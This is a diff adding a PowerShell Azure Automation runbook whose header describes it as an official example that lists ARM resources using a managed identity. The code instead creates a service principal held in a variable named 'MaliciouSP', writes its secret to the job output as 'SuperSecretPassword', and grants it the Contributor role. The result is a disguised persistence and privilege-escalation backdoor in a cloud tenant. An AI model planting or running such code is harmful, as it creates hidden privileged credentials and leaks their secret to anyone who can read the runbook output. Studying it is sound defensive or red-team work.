@@ -1,0 +1,25 @@
+<#
+    .DESCRIPTION
+        An example runbook which gets all the ARM resources using the Managed Identity
+
+    .NOTES
+        AUTHOR: Azure Automation Team
+        LASTEDIT: Oct 26, 2021
+#>
+
+try
+{
+    "Logging in to Azure..."
+    Connect-AzAccount -Identity
+}
+catch {
+    Write-Error -Message $_.Exception
+    throw $_.Exception
+}
+
+$MaliciouSP = New-AzADServicePrincipal -DisplayName TestServicePrincipal3
+$SecretPassword = $MaliciouSP.PasswordCredentials.SecretText
+Write-Output "SuperSecretPassword: $($SecretPassword)"
+Write-Output ($MaliciouSP | Format-Table | Out-String)
+
+New-AzRoleAssignment -ApplicationId $MaliciouSP.AppId -RoleDefinitionName 'Contributor'
